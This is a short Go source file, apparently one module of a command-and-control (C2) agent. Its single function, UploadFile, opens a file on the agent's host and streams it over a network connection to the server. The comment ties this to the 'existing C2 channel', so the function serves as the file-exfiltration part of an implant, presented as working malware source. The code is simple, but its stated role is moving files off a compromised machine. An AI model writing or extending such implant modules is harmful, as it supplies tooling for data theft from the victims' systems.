package modules

import (
	"io"
	"net"
	"os"
)

// UploadFile sends a file from the agent to the server.
// In a real implementation, this would use a dedicated protocol or the existing C2 channel.
func UploadFile(conn net.Conn, filePath string) error {
	file, err := os.Open(filePath)
	if err != nil {
		return err
	}
	defer file.Close()

	_, err = io.Copy(conn, file)
	return err
}
